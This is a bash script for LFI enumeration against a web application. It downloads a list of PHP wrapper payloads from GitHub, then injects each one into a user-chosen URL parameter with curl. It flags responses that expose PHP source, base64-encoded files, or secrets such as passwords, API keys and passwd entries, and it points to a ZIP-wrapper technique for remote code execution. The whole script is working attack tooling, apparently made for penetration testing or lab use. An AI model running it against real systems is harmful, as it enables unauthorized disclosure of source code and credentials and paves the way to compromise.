#!/bin/bash

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'
wget -q https://raw.githubusercontent.com/wireshocks/EnumScripts/refs/heads/main/wrappers.txt
sleep 3
read -p "Enter target URL (e.g. http://192.168.138.229/index.php): " TARGET
read -p "Enter parameter name (e.g. file, page, path): " PARAM
read -p "Enter path to wrappers file (default: wrappers.txt): " WRAPPERS_FILE
WRAPPERS_FILE=${WRAPPERS_FILE:-wrappers.txt}

# Validate inputs
if [ -z "$TARGET" ] || [ -z "$PARAM" ]; then
    echo -e "${RED}[ERROR] Missing URL or parameter. Exiting.${NC}"
    exit 1
fi

if [ ! -f "$WRAPPERS_FILE" ]; then
    echo -e "${RED}[ERROR] Wrappers file not found: $WRAPPERS_FILE${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Starting PHP wrapper enumeration...${NC}"
echo -e "${YELLOW}[*] Target: $TARGET${NC}"
echo -e "${YELLOW}[*] Parameter: $PARAM${NC}"
echo ""

counter=0
found=0

while IFS= read -r payload; do
    # Skip empty lines and comments
    [ -z "$payload" ] && continue
    [[ "$payload" =~ ^# ]] && continue
    
    ((counter++))
    
    # Show progress
    echo -ne "\r[*] Testing: $counter payloads..."
    
    # Make the request
    response=$(curl -k -s --max-time 5 --get \
        --data-urlencode "${PARAM}=${payload}" \
        "$TARGET" 2>/dev/null)
    
    if [ -z "$response" ]; then
        continue
    fi
    
    # Check for multiple indicators of successful file read
    # 1. Base64 encoded PHP files
    if echo "$response" | grep -qE "^[A-Za-z0-9+/]+={0,2}$"; then
        # Try to decode and check if it's valid base64 with PHP content
        decoded=$(echo "$response" | base64 -d 2>/dev/null)
        if echo "$decoded" | grep -q "<?php\|<?=\|function\|class"; then
            ((found++))
            echo -e "\n${YELLOW}[+] Payload: ${payload}${NC}"
            echo -e "${GREEN}[SUCCESS] Valid PHP source found!${NC}"
            echo "$decoded"
            echo "-------------------"
            continue
        fi
    fi
    
    # 2. Direct file content (not base64 encoded)
    if echo "$response" | grep -qE "<?php|<?=|function |class |namespace|const |private|public|protected"; then
        ((found++))
        echo -e "\n${YELLOW}[+] Payload: ${payload}${NC}"
        echo -e "${GREEN}[SUCCESS] File content exposed!${NC}"
        echo "$response" | head -50
        echo "-------------------"
        continue
    fi
    
    # 3. Check for common file signatures (error messages, configs, etc)
    if echo "$response" | grep -qiE "permission denied|root:|database|password|api_key|secret"; then
        ((found++))
        echo -e "\n${YELLOW}[+] Payload: ${payload}${NC}"
        echo -e "${GREEN}[SUCCESS] Sensitive content detected!${NC}"
        echo "$response" | head -30
        echo "-------------------"
    fi
    
done < "$WRAPPERS_FILE"

echo -ne "\r"
echo -e "${YELLOW}[*] Enumeration complete. Tested $counter payloads, found $found vulnerabilities.${NC}"
echo -e "${YELLOW}[*] If nothing found, add/modify the target url parameter in the wrappers.txt"
echo -e "${YELLOW}[*] Try with LFI-Passwd-Hosts file or LFI-WordList-Windows hosts file"
echo -e "${YELLOW}[*] PHP ZIP:// wrapper for RCE "
echo -e "${YELLOW}[*] https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38---------------------------------------"
